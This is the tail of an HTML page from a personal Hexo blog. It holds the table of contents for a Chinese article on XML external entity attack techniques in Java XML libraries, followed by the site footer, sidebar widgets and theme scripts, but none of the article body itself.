+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xxe%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">xxe简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E8%A7%81"><span class="nav-number">2.1.</span> <span class="nav-text">初见</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">各种语言支持的协议</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E6%89%93%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">各种打法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91"><span class="nav-number">3.1.</span> <span class="nav-text">踩坑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="nav-number">3.2.</span> <span class="nav-text">有回显</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="nav-number">3.2.1.</span> <span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CDATA%E5%B8%A6%E5%87%BA%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="nav-number">3.2.2.</span> <span class="nav-text">CDATA带出特殊符号</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%B1%E8%B4%A51"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">失败1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%B1%E8%B4%A52"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">失败2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%88%E9%9C%80%E5%A4%96%E5%B8%A6%EF%BC%89"><span class="nav-number">3.3.</span> <span class="nav-text">无回显（需外带）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%89%93%E6%B3%95%EF%BC%88http%EF%BC%89"><span class="nav-number">3.3.1.</span> <span class="nav-text">一般打法（http）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%B1%E8%B4%A51-1"><span class="nav-number">3.3.2.</span> <span class="nav-text">失败1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7-1"><span class="nav-number">3.3.3.</span> <span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ftp%E6%89%93%E6%B3%95%EF%BC%88"><span class="nav-number">3.3.4.</span> <span class="nav-text">ftp打法（&lt;7u131 &lt;8u131-b09）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99XXE"><span class="nav-number">3.4.</span> <span class="nav-text">报错XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%89%93%E6%B3%95%EF%BC%88%E5%87%BA%E7%BD%91%EF%BC%89"><span class="nav-number">3.4.1.</span> <span class="nav-text">一般打法（出网）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7-2"><span class="nav-number">3.4.2.</span> <span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%89%93%E6%B3%95"><span class="nav-number">3.4.3.</span> <span class="nav-text">不出网打法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb%E5%8D%8F%E8%AE%AE%E5%A4%96%E5%B8%A6%E5%A4%9A%E8%A1%8C"><span class="nav-number">3.5.</span> <span class="nav-text">smb协议外带多行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96trick"><span class="nav-number">3.6.</span> <span class="nav-text">其他trick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#netdoc%E4%BB%A3%E6%9B%BFfile"><span class="nav-number">3.6.1.</span> <span class="nav-text">netdoc代替file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.6.2.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jar%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">3.6.3.</span> <span class="nav-text">jar协议上传文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BE%97%E5%88%B0%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="nav-number">3.6.3.1.</span> <span class="nav-text">得到临时文件目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E6%BA%90%E7%A0%81"><span class="nav-number">3.6.3.2.</span> <span class="nav-text">临时文件生成源码</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%84%E4%B8%AA%E5%BA%93%E4%B8%AD%E7%9A%84XXE"><span class="nav-number">4.</span> <span class="nav-text">各个库中的XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DocumentBuilderFactory%E3%80%90%E5%8F%AF%E5%9B%9E%E6%98%BE%E3%80%91"><span class="nav-number">4.1.</span> <span class="nav-text">DocumentBuilderFactory【可回显】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jdom2%E3%80%90%E5%8F%AF%E5%9B%9E%E6%98%BE%E3%80%91"><span class="nav-number">4.2.</span> <span class="nav-text">jdom2【可回显】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SAXParserFactory-%E5%A4%96%E5%B8%A6"><span class="nav-number">4.3.</span> <span class="nav-text">SAXParserFactory[外带]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom4j%E3%80%90%E5%8F%AF%E5%9B%9E%E6%98%BE%E3%80%91"><span class="nav-number">4.4.</span> <span class="nav-text">dom4j【可回显】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SAXTransformerFactory-%E5%A4%96%E5%B8%A6"><span class="nav-number">4.5.</span> <span class="nav-text">SAXTransformerFactory[外带]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SchemaFactory%E3%80%90%E5%A4%96%E5%B8%A6%E3%80%91"><span class="nav-number">4.6.</span> <span class="nav-text">SchemaFactory【外带】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformerFactory%E3%80%90%E5%A4%96%E5%B8%A6%E3%80%91"><span class="nav-number">4.7.</span> <span class="nav-text">TransformerFactory【外带】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ValidatorSample%E3%80%90%E5%A4%96%E5%B8%A6%E3%80%91"><span class="nav-number">4.8.</span> <span class="nav-text">ValidatorSample【外带】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XMLReader%E3%80%90%E5%A4%96%E5%B8%A6%E3%80%91"><span class="nav-number">4.9.</span> <span class="nav-text">XMLReader【外带】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unmarshaller%E3%80%90%E6%97%A0%E6%BC%8F%E6%B4%9E%E3%80%91"><span class="nav-number">4.10.</span> <span class="nav-text">Unmarshaller【无漏洞】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scxml2%E3%80%90%E5%8F%AFRCE%E3%80%91"><span class="nav-number">4.11.</span> <span class="nav-text">scxml2【可RCE】</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">100.4k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xxe%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">xxe简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E8%A7%81"><span class="nav-number">2.1.</span> <span class="nav-text">初见</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">各种语言支持的协议</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E6%89%93%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">各种打法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91"><span class="nav-number">3.1.</span> <span class="nav-text">踩坑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="nav-number">3.2.</span> <span class="nav-text">有回显</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="nav-number">3.2.1.</span> <span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CDATA%E5%B8%A6%E5%87%BA%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="nav-number">3.2.2.</span> <span class="nav-text">CDATA带出特殊符号</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%B1%E8%B4%A51"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">失败1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%B1%E8%B4%A52"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">失败2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%88%E9%9C%80%E5%A4%96%E5%B8%A6%EF%BC%89"><span class="nav-number">3.3.</span> <span class="nav-text">无回显（需外带）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%89%93%E6%B3%95%EF%BC%88http%EF%BC%89"><span class="nav-number">3.3.1.</span> <span class="nav-text">一般打法（http）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%B1%E8%B4%A51-1"><span class="nav-number">3.3.2.</span> <span class="nav-text">失败1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7-1"><span class="nav-number">3.3.3.</span> <span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ftp%E6%89%93%E6%B3%95%EF%BC%88"><span class="nav-number">3.3.4.</span> <span class="nav-text">ftp打法（&lt;7u131 &lt;8u131-b09）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99XXE"><span class="nav-number">3.4.</span> <span class="nav-text">报错XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%89%93%E6%B3%95%EF%BC%88%E5%87%BA%E7%BD%91%EF%BC%89"><span class="nav-number">3.4.1.</span> <span class="nav-text">一般打法（出网）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7-2"><span class="nav-number">3.4.2.</span> <span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%89%93%E6%B3%95"><span class="nav-number">3.4.3.</span> <span class="nav-text">不出网打法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb%E5%8D%8F%E8%AE%AE%E5%A4%96%E5%B8%A6%E5%A4%9A%E8%A1%8C"><span class="nav-number">3.5.</span> <span class="nav-text">smb协议外带多行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96trick"><span class="nav-number">3.6.</span> <span class="nav-text">其他trick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#netdoc%E4%BB%A3%E6%9B%BFfile"><span class="nav-number">3.6.1.</span> <span class="nav-text">netdoc代替file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">3.6.2.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jar%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">3.6.3.</span> <span class="nav-text">jar协议上传文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BE%97%E5%88%B0%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="nav-number">3.6.3.1.</span> <span class="nav-text">得到临时文件目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E6%BA%90%E7%A0%81"><span class="nav-number">3.6.3.2.</span> <span class="nav-text">临时文件生成源码</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%84%E4%B8%AA%E5%BA%93%E4%B8%AD%E7%9A%84XXE"><span class="nav-number">4.</span> <span class="nav-text">各个库中的XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DocumentBuilderFactory%E3%80%90%E5%8F%AF%E5%9B%9E%E6%98%BE%E3%80%91"><span class="nav-number">4.1.</span> <span class="nav-text">DocumentBuilderFactory【可回显】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jdom2%E3%80%90%E5%8F%AF%E5%9B%9E%E6%98%BE%E3%80%91"><span class="nav-number">4.2.</span> <span class="nav-text">jdom2【可回显】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SAXParserFactory-%E5%A4%96%E5%B8%A6"><span class="nav-number">4.3.</span> <span class="nav-text">SAXParserFactory[外带]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom4j%E3%80%90%E5%8F%AF%E5%9B%9E%E6%98%BE%E3%80%91"><span class="nav-number">4.4.</span> <span class="nav-text">dom4j【可回显】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SAXTransformerFactory-%E5%A4%96%E5%B8%A6"><span class="nav-number">4.5.</span> <span class="nav-text">SAXTransformerFactory[外带]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SchemaFactory%E3%80%90%E5%A4%96%E5%B8%A6%E3%80%91"><span class="nav-number">4.6.</span> <span class="nav-text">SchemaFactory【外带】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformerFactory%E3%80%90%E5%A4%96%E5%B8%A6%E3%80%91"><span class="nav-number">4.7.</span> <span class="nav-text">TransformerFactory【外带】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ValidatorSample%E3%80%90%E5%A4%96%E5%B8%A6%E3%80%91"><span class="nav-number">4.8.</span> <span class="nav-text">ValidatorSample【外带】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XMLReader%E3%80%90%E5%A4%96%E5%B8%A6%E3%80%91"><span class="nav-number">4.9.</span> <span class="nav-text">XMLReader【外带】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unmarshaller%E3%80%90%E6%97%A0%E6%BC%8F%E6%B4%9E%E3%80%91"><span class="nav-number">4.10.</span> <span class="nav-text">Unmarshaller【无漏洞】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scxml2%E3%80%90%E5%8F%AFRCE%E3%80%91"><span class="nav-number">4.11.</span> <span class="nav-text">scxml2【可RCE】</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
